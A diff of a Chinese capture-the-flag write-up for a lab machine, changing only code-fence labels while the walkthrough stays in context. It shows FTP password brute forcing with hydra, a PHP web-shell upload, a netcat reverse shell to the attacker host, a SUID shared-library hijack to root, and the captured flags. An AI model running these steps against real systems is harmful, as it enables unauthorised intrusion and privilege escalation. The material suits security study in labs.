@@ -56,7 +56,7 @@ Hack and Fun. Tested on Virtualbox.
 
 ## ftp 匿名登陆
 
-```shell
+```bash
 ftp> ls -lah
 229 Entering Extended Passive Mode (|||56972|)
 150 Here comes the directory listing.
@@ -81,7 +81,7 @@ Take care.
 
 由于 SSH 服务被禁用，尝试爆破 ftp
 
-```shell
+```bash
 ┌─[randark@parrot]─[~/tmp]
 └──╼ $hydra -v -V -I -l eleanor -P /usr/share/wordlists/rockyou.txt 192.168.56.112 ftp
 [21][ftp] host: 192.168.56.112   login: eleanor   password: ladybug
@@ -89,7 +89,7 @@ Take care.
 
 登陆上去之后，成功控制 ftp 服务，但是还是无法上传文件
 
-```shell
+```bash
 ftp> ls -lah
 229 Entering Extended Passive Mode (|||10520|)
 150 Here comes the directory listing.
@@ -105,7 +105,7 @@ local: simple-backdoor.php remote: simple-backdoor.php
 
 更换为 sftp，成功上传文件
 
-```shell
+```bash
 sftp> ls -lah
 drwxr-xr-x    ? 0        113          4.0K Oct 20  2020 .
 drwxr-xr-x    ? 0        113          4.0K Oct 20  2020 ..
@@ -124,7 +124,7 @@ www-data
 
 ## User - www-data
 
-```shell
+```bash
 # http://192.168.56.112/simple-backdoor.php?cmd=nc+-c+bash+192.168.56.102+9999
 ┌─[randark@parrot]─[~/tmp]
 └──╼ $pwncat-cs -lp 9999
@@ -154,7 +154,7 @@ drwxr-xr-x 4 root root 4.0K Oct 19  2020 ..
 
 发现一个 suid 程序，尝试执行
 
-```shell
+```bash
 (remote) www-data@random:/home/alan$ ./random
 Segmentation fault
 ```
@@ -182,14 +182,14 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 
 那简单，由于 `rand() % 9 + 1` 的限制，直接疯狂运行，总有能对的上的时候
 
-```shell
+```bash
 (remote) www-data@random:/home/alan$ ./random 1
 SUCCESS!! But I need to finish and implement this function
 ```
 
 尝试分析这个程序的链接库
 
-```shell
+```bash
 (remote) www-data@random:/home/alan$ ldd random
         linux-vdso.so.1 (0x00007ffd259e8000)
         librooter.so => /lib/librooter.so (0x00007f23db669000)
@@ -214,7 +214,7 @@ void makemeroot()
 
 远程靶机环境中的 `ld` 有问题，会出现
 
-```shell
+```bash
 (remote) www-data@random:/tmp$ gcc -shared shell.c -o /lib/librooter.so
 shell.c: In function 'makemeroot':
 shell.c:5:2: warning: implicit declaration of function 'setuid'; did you mean 'setenv'? [-Wimplicit-function-declaration]
@@ -235,7 +235,7 @@ compilation terminated.
 
 然后继续尝试运行 `random` 程序
 
-```shell
+```bash
 (remote) www-data@random:/home/alan$ ./random 8
 root@random:/home/alan# whoami
 root
@@ -251,14 +251,14 @@ root
 
 ### flag- user
 
-```shell
+```bash
 root@random:/home/eleanor# cat user.txt
 ihavethapowah
 ```
 
 ### flag - root
 
-```shell
+```bash
 root@random:/root# cat root.txt
 howiarrivedhere
 ```
